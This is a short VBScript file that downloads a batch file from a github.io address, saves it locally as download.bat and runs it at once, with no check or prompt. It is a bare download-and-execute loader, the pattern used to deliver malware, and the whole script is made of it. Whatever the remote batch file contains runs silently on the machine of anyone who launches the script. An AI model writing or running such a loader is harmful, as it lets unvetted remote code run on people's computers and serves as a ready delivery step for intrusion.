' Create objects
Set http = CreateObject("MSXML2.XMLHTTP")
Set shell = CreateObject("WScript.Shell")
Set stream = CreateObject("ADODB.Stream")

' Download the file
url = "https://king-azul.github.io/script-bat.bat"
http.Open "GET", url, False
http.Send

' Save the file
tempFile = "download.bat"
stream.Open
stream.Type = 1  ' Binary
stream.Write http.responseBody
stream.SaveToFile tempFile, 2  ' Overwrite
stream.Close

' Run the file
shell.Run tempFile, 1, False

' Clean up
Set http = Nothing
Set shell = Nothing
Set stream = Nothing